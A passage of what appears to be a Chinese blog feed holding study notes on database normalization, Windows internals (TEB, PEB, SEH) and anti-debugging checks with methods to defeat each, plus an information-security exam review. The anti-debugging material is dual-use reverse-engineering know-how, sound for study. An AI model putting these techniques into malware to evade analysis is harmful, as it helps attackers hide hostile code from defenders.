style="margin-right:0.10903em;">U</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 能由 F 根据 Armstrong 公理导出的充分必要条件是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>⊆</mo><msubsup><mi>X</mi><mi>F</mi><mo lspace="0em" rspace="0em">+</mo></msubsup></mrow><annotation encoding="application/x-tex">Y \subseteq X_{F}^{+}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span></span></span></span></li><li>将函数依赖 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>−</mo><mo>&gt;</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X-&gt;Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 是否能由 F 根据 Armstrong 公理导出的问题转化为求 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo lspace="0em" rspace="0em">+</mo></msubsup></mrow><annotation encoding="application/x-tex">X_{F}^{+}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">+</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span></span></span></span></li></ul></li><li><p>求属性集闭包算法</p></li><li><p>码值理论 — 利用属性集闭包判断某个已知的属性集是否为关系的候选码</p></li></ul></li><li><p>最小函数依赖集</p><ul><li>定义 与 求解算法</li><li>函数依赖集 F 的最小覆盖可能会有多个，与删减顺序有关</li></ul></li><li><p>关系模式的分解方法</p><ul><li>由问题引入模式分解“等价性”的两个判定准则：“无损连接性”和“函数依赖保持性”</li><li>分解的无损连接性(无损分解)<ul><li>构造二维表</li><li>分解为两个关系的情况</li></ul></li><li>分解的函数依赖保持性<ul><li>分解的函数依赖保持行</li><li>保持依赖的判定算法</li></ul></li><li>关系模式的分解算法<ul><li>满足3NF的函数依赖保持分解算法</li><li>满足3NF的函数依赖保持和无损连接的分解算法</li></ul></li></ul></li></ul><h2 id="题型"><a class="markdownIt-Anchor" href="#题型"></a> 题型</h2><ol><li>范式判断</li><li>求属性集闭包</li><li>码值定理求候选码</li><li>求最小函数依赖集，三步走，右化小(单属性)，消除冗余，左删冗余</li><li>判断模式分解是否无损连接(两种情况)</li><li>判断模式分解是否保持函数依赖，需要在 F 中把左边决定属性的闭包加在分出的 R 中，之后再求并集</li><li>3NF的模式分解算法<ol><li>满足3NF的函数依赖保持，求最小函数依赖集，之后合并</li><li>满足3NF的函数依赖保持和无损连接</li></ol></li><li>分解 BC NF，使用码值定理求候选码</li></ol><h1 id="数据库设计"><a class="markdownIt-Anchor" href="#数据库设计"></a> 数据库设计</h1><h2 id="考试要点-5"><a class="markdownIt-Anchor" href="#考试要点-5"></a> 考试要点</h2><ul><li>数据库设计的步骤</li><li>需求分析(数据流图、数据字典)</li><li>概念结构设计(ER图、消除冲突)</li><li>逻辑结构设计(ER图到逻辑结构的转换、规范化)</li></ul><h1 id="数据库保护"><a class="markdownIt-Anchor" href="#数据库保护"></a> 数据库保护</h1><h2 id="考试要点-6"><a class="markdownIt-Anchor" href="#考试要点-6"></a> 考试要点</h2><ul><li>事务、事务特性</li><li>数据库恢复的概念、数据库故障的种类、故障恢复策略</li><li>并发操作引发的问题、可串行化判定方法(冲突可串行化、前驱图)</li><li>建立可串行化调度方法(封锁技术、三级封锁协议及解决的问题，2PL协议，冲突可串行化定义)</li><li>数据库安全性概念、措施、存取控制SQL语句</li><li>数据库完整性概念、约束的类型</li></ul>]]></content>
    
    
    <categories>
      
      <category>课程复习笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高级逆向分析技术</title>
    <link href="/posts/d0607d51.html"/>
    <url>/posts/d0607d51.html</url>
    
    <content type="html"><![CDATA[<h1 id="逆向分析技术"><a class="markdownIt-Anchor" href="#逆向分析技术"></a> 逆向分析技术</h1><blockquote><p><a href="https://bbs.kanxue.com/thread-225740.htm">反调试技术总结</a></p></blockquote><h2 id="tls回调函数"><a class="markdownIt-Anchor" href="#tls回调函数"></a> TLS回调函数</h2><p>​TLS(Thread Local Storage, 线程局部存储)回调函数(Callback Function).</p><p><a href="https://xz.aliyun.com/t/12057">TLS回调函数的学习</a></p><h2 id="teb"><a class="markdownIt-Anchor" href="#teb"></a> TEB</h2><p>​<strong>TEB</strong>：线程环境块，该结构包含进程中运行线程的各种信息，进程中的每个线程都对应一个TEB结构体。</p><h3 id="重要成员"><a class="markdownIt-Anchor" href="#重要成员"></a> 重要成员</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202139261.png" alt="image-20230320213950169" /></p><ul><li><code>ProcessEnvironmentBlock</code><ul><li>指向PEB结构体的指针。–PEB是进程环境块，每个进程对应一个PEB结构体。</li></ul></li><li><code>NtTib</code><ul><li>TEB结构体的第一个成员为_NT_TIB结构体(TIB指线程信息块)</li></ul></li></ul><h3 id="teb的访问方法"><a class="markdownIt-Anchor" href="#teb的访问方法"></a> TEB的访问方法</h3><ul><li><code>Ntdll.NtCurrentTeb()</code><ul><li>此API用来返回当前线程的TEB结构体的地址(返回 <code>FS:[18]</code>)</li></ul></li></ul><h4 id="fs段寄存器"><a class="markdownIt-Anchor" href="#fs段寄存器"></a> FS段寄存器</h4><ul><li><p>FS段寄存器用来指示当前线程的TEB结构体----<strong>FS寄存器持有SDT的索引，该索引持有实际TEB地址</strong>。而由于段寄存器实际存储的是SDT的索引，所以它也被称为“段选择符”。</p><blockquote><p>SDT 位于内核内存区域，其地址存储在特殊的寄存器 GDTR (全局描述符表寄存器) 中</p></blockquote><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202146251.png" alt="image-20230320214632226" /></p></li><li><p><code>FS:[0x18] = TEB 起始地址</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202147341.png" alt="image-20230320214758319" /></p></li><li><p><code>FS:[0x30] = PEB 起始地址</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202148834.png" alt="image-20230320214844817" /></p></li><li><p><code>FS:[0] = SEH 起始地址</code></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202149069.png" alt="image-20230320214914053" /></p></li></ul><h2 id="peb"><a class="markdownIt-Anchor" href="#peb"></a> PEB</h2><p>​<strong>PEB</strong>：进程环境块，每个进程对应一个PEB结构体。</p><h3 id="重要成员-2"><a class="markdownIt-Anchor" href="#重要成员-2"></a> 重要成员</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202151881.png" alt="image-20230320215125838" /></p><ul><li><p><code>BeingDebugged</code></p><ul><li><code>Kernel32.dll</code> 中的 <code>IsDebuggerPresent()</code> API通过检测 <code>PEB.BeingDebugged</code> 成员来确定是否正在调试进程(是，返回1；否则，返回0)</li></ul></li><li><p><code>ImageBaseAddress</code></p><ul><li><p><code>PEB.ImageBaseAddress</code> 成员用来表示进程的 ImageBase 。其中 <code>GetModuleHandle()</code> API 用来获取 ImageBase。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">HMODULE <span class="hljs-title">GetModuleHandleA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in, optional] LPCSTR lpModuleName</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure></li><li><p>向 <code>IpModuleName</code> 参数赋值为 NULL，调用 <strong>GetModuleHandle()</strong> 函数将返回进程被加载的 ImageBase。</p></li></ul></li><li><p><code>Ldr</code>(+0xC)</p><ul><li>指向 <code>_PEB_LDR_DATA</code> 结构体的指针。</li></ul></li><li><p><code>ProcessHeap &amp; NtGlobalFlag</code></p><ul><li>应用于反调试技术，若进程处于调试状态，则两个成员就持有特定值。</li></ul></li></ul><h2 id="seh"><a class="markdownIt-Anchor" href="#seh"></a> SEH</h2><p>​<code>SEH</code> 是 Windows 操作系统提供的异常处理机制，在程序源代码中使用 <code>__try、__except、__finall</code> 关键字来具体实现。</p><h3 id="os的异常处理方法"><a class="markdownIt-Anchor" href="#os的异常处理方法"></a> OS的异常处理方法</h3><ul><li><p>进程运行过程中若发生异常，OS会委托进程处理。</p><ul><li><p>若是进程代码中存在具体的异常处理(如 SEH 异常处理器) 代码，则能顺利处理相关异常，程序继续运行</p></li><li><p>否则相关异常无法处理，OS就会启动默认的遗产给处理机制，终止程序的运行</p></li></ul></li></ul><h3 id="调试器运行时的异常处理方法"><a class="markdownIt-Anchor" href="#调试器运行时的异常处理方法"></a> 调试器运行时的异常处理方法</h3><ul><li><p>若<strong>被调试进程</strong>内部发生异常，OS会先把异常抛给**调试进程处理 **(即调试器)。这里如果被调试者发生异常时，调试器就会暂停运行，必须采取某种措施来处理异常，完成后继续调试。遇到异常时经常采用的几种处理方法如下：</p><ol><li><p>直接修改异常：代码、寄存器、内存</p><p>被调试者发生异常时，调试器会在发生异常的代码处暂停，此时可以通过调试器直接修改有问题的代码、内存、寄存器等，排除异常后，调试器继续运行程序</p></li><li><p>将异常抛给被调试者处理</p><p>如果被调试者内部存在SEH (异常处理函数) 能够处理异常，那么异常通知会发送给调试者，由被调试者自行处理。</p></li><li><p>OS默认的异常处理机制</p><p>如果调试器于被调试者都无法处理(或故意不处理)当前的异常，则OS的默认异常处理机制会处理它，终止被调试进程，同时结束调试。</p></li></ol></li></ul><h3 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202214355.png" alt="image-20230320221405286" /></p><ul><li><p><code>EXCEPTION_ACCESS_VIOLATION (C0000005)</code></p><ul><li><p>试图访问不存在或不具有访问权限的内存区域时，就会发生 EXCEPTION_ACCESS_VIOLATION (非法访问异常)</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202215544.png" alt="image-20230320221537507" /></p></li></ul></li><li><p><code>EXCEPTION_BREAKPOINT (80000003)</code></p><ul><li>在运行代码中设置断点后，CPU尝试执行该地址处的指令时，将会发生此类异常。调试器就是利用该异常实现断点功能的</li></ul></li><li><p><code>EXCEPTION_ILLEGAL_INSTRUCTION (C000001D)</code></p><ul><li>CPU遇到无法解析的指令时引发该异常</li></ul></li><li><p><code>EXCEPTION_INT_DIVIDE_BY_ZERO (C0000094)</code></p><ul><li>INTEGER 触发运算中，若是分母为0，则引发此异常</li></ul></li><li><p><code>EXCEPTION_SINGLE_STEP (80000004)</code></p><ul><li>Single Step(单步) 的含义时执行1条指令，然后暂停。CPU进入单步模式后，每执行一条指令就会引发此异常，暂停运行。将 EFLAGS 寄存器的 TF(Trap Flag, 陷阱标志) 位设置为1后，CPU就会进入单步工作模式</li></ul></li></ul><p><a href="https://www.yunzh1jun.com/2022/05/27/WindowsSEH/">学习博客</a></p><h1 id="反调试技术"><a class="markdownIt-Anchor" href="#反调试技术"></a> 反调试技术</h1><h2 id="静态反调试技术"><a class="markdownIt-Anchor" href="#静态反调试技术"></a> 静态反调试技术</h2><h3 id="peb-2"><a class="markdownIt-Anchor" href="#peb-2"></a> PEB</h3><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202235513.png" alt="image-20230320223555485" /></p><blockquote><p>获取PEB地址的方法</p></blockquote><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303202238312.png" alt="image-20230320223800272" /></p><blockquote><p>下方(+0x)的基址为 FS:[0x30]</p></blockquote><h4 id="beingdebugged0x2"><a class="markdownIt-Anchor" href="#beingdebugged0x2"></a> BeingDebugged(+0x2)</h4><ul><li><p>进程处于调试状态时，<code>PEB.BeingDebugged</code> 成员(+0x2)的值被设置为1(TRUE)；进程非调试状态下运行时，其值被设置为0(FALSE)</p><ul><li><code>Kernel32.dll</code> 中的 <code>IsDebuggerPresent()</code> API通过获取 <code>PEB.BeingDebugged</code> 的值来判断进程是否处于被调试状态</li></ul></li><li><p>破解之法：</p><ul><li>借助 DBG 将 <code>PEB.BeingDebugged</code> 的值修改为0即可</li></ul></li></ul><h4 id="ldr0xc"><a class="markdownIt-Anchor" href="#ldr0xc"></a> Ldr(+0xC)</h4><ul><li>调试进程时，其堆内存区域中就会出现一些特殊标识，表示它正处于被调试状态。其中最醒目的是，未使用的堆内存区域全部填充着 <code>0xFEEEFEEE</code> ，这证明正在调试进程。利用这一特征即壳判断进程是否处于被调试状态。</li><li><code>PEB.Ldr</code> 成员是一个指向 <code>_PEB_LDR_DATA</code> 结构体的指针，而 <code>_PEB_LDR_DATA</code> 结构体恰好是在堆内存区域创建的，所以可以使用 <code>PEB.Ldr</code> 指向堆内存地址，查看其是否填充了 <code>0xFEEEFEEE</code>。</li><li>破解之法：<ul><li>将填充着 <code>0xFEEEFEEE</code> 的区域全部覆写为NULL即可。</li></ul></li></ul><blockquote><p>该方法仅适用于 windows XP x系统，之后的系统无法使用。另外，利用附加功能将运行中的进程附加到调试器时，堆内存中并不出现上述标志。</p></blockquote><h4 id="processheap0x18"><a class="markdownIt-Anchor" href="#processheap0x18"></a> ProcessHeap(+0x18)</h4><ul><li><p><code>PEB.ProcessHeap</code> 成员是指向 <code>HEAP</code> 结构体的指针</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291506608.png" alt="image-20230329150650538" /></p></li><li><p>进程正常运行(非调试运行)时，<code>Heap.Flags(+0xC)</code>的值为<code>0x2</code>，<code>Heap.ForceFlags(+0x10)</code>的值为<code>0x0</code>。进程处于被调试状态时，这些值会随之改变</p></li><li><p>破解之法：</p><ul><li>重新设置为特定值即可</li></ul></li></ul><blockquote><p>只适用于Windows XP系统。此外，将运行中的进程附加到调试器时，也不会出现上述特征</p></blockquote><h4 id="ntglobalflag0x68"><a class="markdownIt-Anchor" href="#ntglobalflag0x68"></a> NtGlobalFlag(+0x68)</h4><ul><li><p>调试进程时，<code>PEB.NtGlobalFlag(+0x68)</code> 的值会被设置为<code>0x70</code></p></li><li><p>其被设置为<code>0x70</code>是下列 Flags值进行 <code>bit OR</code> 运算的结果</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291518918.png" alt="image-20230329151804891" /></p></li><li><p>破解之法：</p><ul><li>重设 <code>PEB.NtGlobalFlag</code> 值为0即可 (PEB.NtGlobalFlag = 0)</li></ul></li></ul><blockquote><p>将运行中的进程附加到调试器时，NtGlobalFlag的值不变</p></blockquote><h3 id="ntqueryinformationprocess"><a class="markdownIt-Anchor" href="#ntqueryinformationprocess"></a> NtQueryInformationProcess()</h3><p>​通过 <code>NtQueryInformationProcess() API</code> 可以获取各种与进程调试相关的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// NtQueryInformationProcess 函数原型</span><br><span class="hljs-function">__kernel_entry NTSTATUS <span class="hljs-title">NtQueryInformationProcess</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  IN HANDLE           ProcessHandle, <span class="hljs-comment">// 进程句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">  IN PROCESSINFOCLASS ProcessInformationClass,  <span class="hljs-comment">// 检索的进程信息类型</span></span></span><br><span class="hljs-params"><span class="hljs-function">  OUT PVOID           ProcessInformation, <span class="hljs-comment">// 接收进程信息的缓冲区指针</span></span></span><br><span class="hljs-params"><span class="hljs-function">  IN ULONG            ProcessInformationLength,  <span class="hljs-comment">// 缓冲区指针大小</span></span></span><br><span class="hljs-params"><span class="hljs-function">  OUT PULONG          ReturnLength<span class="hljs-comment">// 实际接收的进程信息大小</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>​给 <code>NtQueryInformationProcess()</code> 函数的第二个参数 <code>PROCESSINFOCLASS ProcessInformationClass</code> 指定特定的值并调用该函数，则相关信息会设置到其第三个参数 <code>PVOID ProcessInformation</code>。这里关注 <code>PROCESSINFOCALSS</code> 中与调试器探测有关的成员 <code>ProcessDebugPort(0x7)</code>，<code>ProcessDebugObjectHandle(0x1E)</code>， <code>ProcessDebugFlags(0x1F)</code>。(括号中的值代表第二个参数的取值，对应着名称)</p><h4 id="processdebugport0x7"><a class="markdownIt-Anchor" href="#processdebugport0x7"></a> ProcessDebugPort(0x7)</h4><p>​进程处于调试状态时，系统会为它分配一个调试端口(Debug Port)。 <code>ProcessInformationClass</code> 参数的值设置为 <code>ProcessDebugPort(0x7)</code> 时，调用 <code>NtQueryInformationProcess()</code> 函数就能获取调试段口。若进程处于非调试状态，则变量 <code>dwDebugPort</code> 的值设置为0；若进程处于调试状态，则变量 <code>dwDebugPort</code> 的值设置为 0xFFFFFFFF</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303311752206.png" alt="image-20230331175210132" /></p><h4 id="processdebugobjecthandle0x1e"><a class="markdownIt-Anchor" href="#processdebugobjecthandle0x1e"></a> ProcessDebugObjectHandle(0x1E)</h4><p>​调试进程时会生成调试对象(<code>Debug Object</code>)。函数的第二个参数值为 <code>ProcessDebugObjectHandle(0x1E)</code> 时，调用函数后通过第三个参数就能获得调试对象的句柄。进程处于调试状态时，调试对象句柄的值就存在；若进程处于非调试状态，则调试对象句柄值为NULL。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303311755135.png" alt="image-20230331175507061" /></p><h4 id="processdebugflags0x1f"><a class="markdownIt-Anchor" href="#processdebugflags0x1f"></a> ProcessDebugFlags(0x1F)</h4><p>​检测 <code>Debug Flags(调试标志)</code> 的值也可以判断进程是否处于被调试状态。函数的第二个参数设置为 <code>ProcessDebugFlags(0x1F)</code> 时，调用函数后通过第三个参数即可获取调试标志的值：若为0，则进程处于被调试状态；若为1，则进程处于非调试状态。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303311757040.png" alt="image-20230331175707977" /></p><h4 id="破解之法"><a class="markdownIt-Anchor" href="#破解之法"></a> 破解之法</h4><p>​破解使用 <code>NtQueryInformationProcess() API</code> 探测调试器的技术，应当对该函数在特定参数值(<code>ProcessInformationClass</code>) 下输出的值进行操作。特定参数值时前面提过的三个。即将与三个相关的检测返回值(<code>dwDebugPort, DebugObject, DebugFlag</code>)进行更改。</p><h3 id="ntquerysysteminformation"><a class="markdownIt-Anchor" href="#ntquerysysteminformation"></a> NtQuerySystemInformation()</h3><p>​这是基于调试环境检测的反调试技术。运用这种反调试技术可以检测当前OS是否在调试模式下运行。(主要使用windbg调试target主机，查看其OS信息)。这里主要使用 <code>ntdall!NtQuerySystemInformation() API</code> 的系统函数，获取当前运行的多重OS信息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__kernel_entry NTSTATUS <span class="hljs-title">NtQuerySystemInformation</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in, out]       PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]            ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out, optional] PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>​<code>SYSTEM_INFORMATION_CALSS SystemInformationClass</code> 参数中指定需要的系统信息类型，将某结构体的地址传递给 <code>PVOID SystemInformation</code> 参数，API返回时，该结构体中就填充着相关信息。</p><p>​向 <code>SystemInformation</code> 参数传入 <code>SystemKernelDebuggerInformation</code> 值(0x23)，即可判断出当前OS是否在调试模式下运行</p><h3 id="ntqueryobject"><a class="markdownIt-Anchor" href="#ntqueryobject"></a> NtQueryObject()</h3><p>​系统中的某个调试器调试进程时，会创建一个调试对象类型的内核对象。检测该对象是否存在即可判断是否有进程正在呗调试。</p><p>​<code>ntdll!NtQueryObject() API</code> 用来获取系统各种内核对象的信息。调用 <code>NtQueryObject()</code> 函数时，先向第二个参数 <code>OBJECT_INFORMATION_CALSS ObjectInformationClass</code> 赋予某个特定值，调用API后，包含相关信息的结构体指针就返回第三个参数 <code>PVOID ObjectInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="hljs-title">NtQueryObject</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in, optional]  HANDLE                   Handle,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]            OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out, optional] PVOID                    ObjectInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">  [in]            ULONG                    ObjectInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  [out, optional] PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><h3 id="zwsetinformationthread"><a class="markdownIt-Anchor" href="#zwsetinformationthread"></a> ZwSetInformationThread()</h3><p>​利用 <code>ZwSetInformationThread() API</code> 被调试者可将自身从调试器中分离出来—强制分离(Detach)被调试者和调试器的技术</p><p><img src="C:/Users/NU/AppData/Roaming/Typora/typora-user-images/image-20230331185309453.png" alt="image-20230331185309453" /></p><p>​<code>ZwSetInformationTread()</code> 函数用来为线程设置信息的。该函数拥有2个参数，第一个参数 <code>TreadHandle</code> 用来接受当前线程的句柄，第二个参数 <code>ThreadInformationClass</code> 表示线程信息类型，若其值设置为 <code>ThreadHideFromDebugger(0x11)</code>，调用该函数后，调试进程就会被分离出来。<code>ZwSetInformationThread() API</code> 不会对正常运行的程序(非调试运行)产生任何影响，但若运行的时调试器程序，调用该API将使调试器终止运行，同时终止自身进程。</p><h4 id="破解之法-2"><a class="markdownIt-Anchor" href="#破解之法-2"></a> 破解之法</h4><p>​调用API之前，查找存储在栈中的第二个参数 <code>ThreadInformationClass</code> 值，若其值为 <code>ThreadHideFromDebugger(0x11)</code> ，则修改为0后继续运行即可。</p><blockquote><p>Windows XP 以后新增了 DebugActiveProcessStop() API</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">DebugActiveProcessStop</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  [in] DWORD dwProcessId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>​<code>DebugActiveProcessStop() API</code> 用来分离调试器和被调试器，从而停止调试。而 <code>ZwSetInformationTread() API</code> 则用来隐藏当前线程，使调试器无法再受到该线程的调试事件，最终停止调试。</p>]]></content>
    
    
    <categories>
      
      <category>逆向笔记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>信息系统安全</title>
    <link href="/posts/e9381314.html"/>
    <url>/posts/e9381314.html</url>
    
    <content type="html"><![CDATA[<h1 id="复习资料"><a class="markdownIt-Anchor" href="#复习资料"></a> 复习资料</h1><h2 id="历年考题"><a class="markdownIt-Anchor" href="#历年考题"></a> 历年考题</h2><h3 id="2023-a"><a class="markdownIt-Anchor" href="#2023-a"></a> 2023-A</h3><p>​基本全是分析题😫，前6道题10分(也会一道题分成两个5分的)，后面两道综合题25+15。题目顺序和具体内容记不太清了，🤐是故意的还是不小心XD。</p><p><strong>一、“简答题”</strong></p><ol><li>说明消息认证码和加密技术实现消息认证的异同。</li><li>给了个被警告证书问题的URL，要求结合证书的相关知识解释可能出了什么问题。</li><li>Kerberos中Client和AS交互AS不会验证对方用户身份就把包发过去是否安全。</li><li>为防止在线/离线的字典攻击给出常用的策略、协议、方法。</li><li>在内核态设计一个针对文件透明加密的系统(就是EFS~)。</li><li>几种数据备份的考察和RAID-5特点。</li></ol><p><strong>二、分析题</strong></p><ol><li>访问控制(给你案例，让你分析采用什么策略(DAC、MAC等))，使用什么模型(BLP、Biba、BN)。</li><li>实现低粒度访问控制，方便员工外出办公、读取文件，TLS VPN/IPSEC VPN选什么。</li><li>给出原表求匿名表。</li></ol><h3 id="2024-a"><a class="markdownIt-Anchor" href="#2024-a"></a> 2024-A</h3><p>​全是老师说的，考点一字不差。反正没有见过这么匹配的试卷了</p><p><strong>一、“综述题”</strong></p><ol><li>说明保密性、完整性、可用性的含义</li><li>说明活动目录所涉及的服务机制，命名解析，目录服务，认证，逻辑组件</li><li>给出一个警告的证书，要求结合证书的相关知识解释可能出了什么问题</li><li>BN模型，利用DAC和MAC来说明对读写的保护</li><li>写出协议和算法，要求单向认证和密钥交换，用随机数保持新鲜性，要求使用非对称算法</li><li>设备身份认证<ol><li>物流体系里面，要求对于多个物品的认证</li><li>微信扫描PC二维码登录，问一开始信任的凭证是什么，之后为二维码的作用</li></ol></li></ol><p><strong>二、“分析题1”</strong></p><ol><li>4个磁盘，一个坏了，问采用什么RAID组成策略，恢复方法</li><li>实现低粒度访问控制，方便员工外出办公、公网读取服务器文件，TLS VPN/IPSEC VPN选什么。</li></ol><p><strong>三、“分析题2”</strong></p><ol><li>问匿名隐私保护的基本原理和手段</li><li>差分隐私的全局敏感性和局部敏感性什么时候用</li><li>同态加密的基本原理</li></ol><h2 id="老师重点"><a class="markdownIt-Anchor" href="#老师重点"></a> 老师重点</h2><p><strong>题型</strong></p><ul><li>综述 60 --&gt; 6个</li><li>分析 40 --&gt; 2~3个</li></ul><p><strong>第1章 概述</strong></p><ol><li>安全属性</li><li>安全漏洞</li></ol><p><strong>第2章 安全管理</strong></p><ol><li>信息安全管理的PDCA管理流程</li><li>活动目录设计及关键机制 --&gt; 认证、命名解析、目录访问、逻辑管理组件、物理组件</li><li>组策略</li><li>组策略的设置对象</li><li>组策略的处理和优先级</li><li>组策略的冲突解决方法</li></ol><p>补充：</p><ol><li>常见的安全标准TESEC、CC</li><li>等保标准与划分</li><li>Windows如何实施安全管理</li><li>DEP &amp; ASLR</li></ol><p><strong>第3章 密钥管理基础架构</strong></p><ol><li>PKI架构</li><li>CA建立信任的方式</li><li>数字证书及其验证(特别是第四步，需要掌握web应用中证书验证的细节) --&gt; 